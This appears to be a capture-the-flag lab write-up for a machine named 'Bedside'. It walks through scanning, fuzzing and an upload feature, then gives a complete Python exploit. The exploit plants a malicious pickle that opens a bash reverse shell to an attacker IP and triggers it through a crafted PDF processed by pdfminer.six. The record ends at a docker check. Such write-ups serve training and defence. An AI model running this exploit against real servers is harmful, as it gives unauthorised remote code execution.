# Bedside

<figure><img src=".gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 1**</mark>

**Let's start off with a quick nmap scan.**

```bash
ip=10.129.50.75

## TCP Scan
nmap -p- --min-rate 10000 -n -Pn -oA nmap/bedside_tcp.htb $ip
# 22/tcp open  ssh
# 80/tcp open  http



# Deeper tcp scan
nmap -sC -sV -A -p53,2222,2121,80,8080,3000,5000,9000,8000 -oA nmap/bedside_tcp $ip

# UDP scan
nmap -sU --min-rate 10000 -n -Pn -oA nmap/bedside_udp.htb $ip
```

<mark style="color:blue;">**Step 2**</mark>

**Let's modify the hosts and and discover the web app**

{% code overflow="wrap" %}
```bash
echo "$ip bedside.htb" | tee -a /etc/hosts
```
{% endcode %}

<figure><img src=".gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 3**</mark>

**I start Fuzzing i discovered this javaendpoint**

{% code overflow="wrap" %}
```bash
feroxbuster -u http://bedside.htb \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -x php,txt,bak,sql,js,html,zip,tar.gz,old,save \
  -r --depth 3 \
  --collect-words \
  --extract-links \
  --auto-tune \
  -t 50 \
  -s 200 204 301 302 307 401 403 500
  
  # 200      GET    10907l    44549w   289782c http://bedside.htb/javascript/jquery/jquery
```
{% endcode %}

**The way we see it like that because they use Apache MultiViews (Content Negotiation) is enabled**

**Apache automatically searched the directory for any file starting with**

**I review the file in details but it seems a dead end i cant found anything interesting**

{% code overflow="wrap" %}
```bash
DEFAULT_SIZE=$(curl -s -o /dev/null -w "%{size_download}" http://bedside.htb) && echo -e "\n[+] Default response size detected: $DEFAULT_SIZE bytes. Starting scan...\n" && ffuf -u http://bedside.htb -H "Host: FUZZ.bedside.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs $DEFAULT_SIZE -mc 200,302,401,403,500 -t 100 -rate 500

# research                [Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 92ms]
```
{% endcode %}

<mark style="color:blue;">**Step 4**</mark>&#x20;

**we have an upload functionnality lets try to upload a php webshell**

<figure><img src=".gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

**i bypass the file extensions error then i receve this MYME-TYPE error, and also we know the uplaod path in /uploads, so we work to bypass the MYME-TYPE**

**i was tryin this but i lately see this in the headers:&#x20;**<mark style="color:red;">**X-Powered-By: pdfminer.six**</mark>

**The `pdfminer.six` library has a known critical vulnerability that perform insecure deserialization**

**then after tryin multipe time i build this exploit that it worked**

{% code overflow="wrap" %}
```python
import pickle
import gzip
import requests

# 1. Create the malicious pickle payload for DIRECT reverse shell
class RCE:
    def __reduce__(self):
        # REPLACE 'YOUR_IP' WITH YOUR ACTUAL TUN0 IP ADDRESS
        cmd = """__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.14.6/9001 0>&1"')"""
        return (eval, (cmd,))

with gzip.open('shell.pickle.gz', 'wb') as f:
    pickle.dump(RCE(), f)
print("[+] Created shell.pickle.gz")

# 2. Create the malicious PDF trigger
# We point it to /tmp/shell so it looks for /tmp/shell.pickle.gz (a writable directory)
# But we will upload our shell.pickle.gz to the web root, and we'll also upload it to /tmp via a second payload if needed.
# Actually, let's just use the absolute path to the uploads dir, but name it something Apache won't block if we fall back.
# Better yet: we will upload shell.pickle.gz, and the PDF will trigger it.

# Hex encoded path: /var/www/research.bedside.htb/uploads/shell
path = "/var/www/research.bedside.htb/uploads/s"
hex_path = "".join(f"#{ord(c):02x}" for c in path)

pdf_content = f"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>
endobj
4 0 obj
<< /Length 44 >>
stream
BT
/F1 12 Tf
100 700 Td
(Malicious PDF) Tj
ET
endstream
endobj
5 0 obj
<<
/Type /Font
/Subtype /Type0
/BaseFont /MaliciousFont-Identity-H
/Encoding /{hex_path}
/DescendantFonts [6 0 R]
>>
endobj
6 0 obj
<< /Type /Font /Subtype /CIDFontType2 /BaseFont /MaliciousFont /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> /FontDescriptor 7 0 R >>
endobj
7 0 obj
<< /Type /FontDescriptor /FontName /MaliciousFont /Flags 4 /FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0 /Ascent 1000 /Descent -200 /CapHeight 800 /StemV 80 >>
endobj
xref
0 8
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000274 00000 n
0000000370 00000 n
0000000503 00000 n
0000000673 00000 n
trailer
<< /Size 8 /Root 1 0 R >>
startxref
871
%%EOF
"""

with open('exploit.pdf', 'wb') as f:
    f.write(pdf_content.encode())
print("[+] Created exploit.pdf")

# 3. Upload both files
url = "http://research.bedside.htb/"

print("[*] Uploading shell.pickle.gz...")
with open('shell.pickle.gz', 'rb') as f:
    r1 = requests.post(url, files={'uploadFile': ('shell.pickle.gz', f, 'application/gzip')})
    if "successfully" in r1.text:
        print("[+] shell.pickle.gz uploaded!")

print("[*] Uploading exploit.pdf to trigger RCE...")
print("[!] CHECK YOUR NETCAT LISTENER NOW!")
with open('exploit.pdf', 'rb') as f:
    r2 = requests.post(url, files={'uploadFile': ('exploit.pdf', f, 'application/pdf')})
    if "successfully" in r2.text:
        print("[+] exploit.pdf uploaded! Triggering deserialization...")

```
{% endcode %}

{% code overflow="wrap" %}
```bash
listener 9001
datawrangler@data-wrangler:/app$
```
{% endcode %}

{% hint style="info" %}
**Instead of trying to trick the web server (Apache) into executing a file, we tricked the backend application (Python) into executing our code&#x20;**_**in memory**_**.The massive clue was this HTTP header:**

> **`X-Powered-By: pdfminer.six`**

**This told us the backend uses a Python library called `pdfminer.six` to process uploaded PDFs (likely to extract text for "AI training", as the website claimed).**
{% endhint %}

{% hint style="warning" %}
1. **We uploaded `shell.pickle.gz`. The server saved it to `/var/www/research.bedside.htb/uploads/shell.pickle.gz`.**
2. **We uploaded `exploit.pdf`.**
3. **The backend Python script received the PDF and passed it to `pdfminer.six` to process.**
4. **`pdfminer.six` read the PDF, saw the custom `/Encoding` path, and said:&#x20;**_**"Ah, I need to load the character map for this font."**_
5. **The Fatal Flaw: The library blindly took the path from the PDF, appended `.pickle.gz` to it, and tried to load `/var/www/research.bedside.htb/uploads/shell.pickle.gz`.**
6. **It used `pickle.load()` to read the file.**
7. **Python triggered the `__reduce__` method, executing your `bash` reverse shell command.**
8. **Because the Python script is running as the web server user (`www-data`), the reverse shell connected back to our Netcat listener as `www-data`.**
{% endhint %}

<mark style="color:blue;">**Step 6**</mark>

**i cant  see process or either anything we can be on a minimal chroot bash or a docker isntance i confirm we are in docker**

{% code overflow="wrap" %}
```bash
ls -la /
# -rwxr-xr-x   1 root         root       0 Nov 11  2025 .dockerenv
```
{% endcode %}
